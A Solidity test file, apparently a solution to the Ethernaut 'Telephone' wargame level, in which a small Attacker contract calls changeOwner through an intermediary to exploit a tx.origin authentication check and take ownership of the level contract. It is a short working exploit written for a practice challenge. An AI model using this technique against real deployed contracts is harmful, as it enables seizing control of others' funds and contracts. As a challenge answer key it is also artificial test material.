// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Telephone.sol";
import "src/levels/TelephoneFactory.sol";

contract TestTelephone is BaseTest {
    Telephone private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new TelephoneFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Telephone(levelAddress);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // Deploy the Exploiter contract
        Attacker attacker = new Attacker();
        attacker.attack(level);
        assertEq(level.owner(), player);

        vm.stopPrank();
    }
}

contract Attacker {
    function attack(Telephone _level) public {
        _level.changeOwner(msg.sender);
    }
}
